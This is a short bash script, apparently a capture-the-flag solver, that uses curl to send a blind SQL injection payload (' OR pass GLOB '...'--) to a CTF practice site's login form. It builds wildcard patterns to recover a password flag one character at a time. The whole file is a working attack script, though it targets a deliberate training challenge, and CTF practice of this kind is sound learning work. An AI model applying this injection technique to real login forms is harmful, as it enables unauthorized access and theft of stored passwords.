#!/bin/bash

function check() {
pass="FLAG_"
for i in `seq 0 $1`
do
	if [ $i -ne 0 ];then
		pass+="?";
	fi
done
pass+=$2
num=`expr 15 - $1`
for i in `seq 0 $num`
do
	if [ $i -ne 0 ];then
		pass+="?";
	fi
done
curl -d "id=admin&pass=' OR pass GLOB '$pass'--" ctfq.sweetduet.info:10080/~q6/
}

RESULT=`check $@`
echo "$RESULT"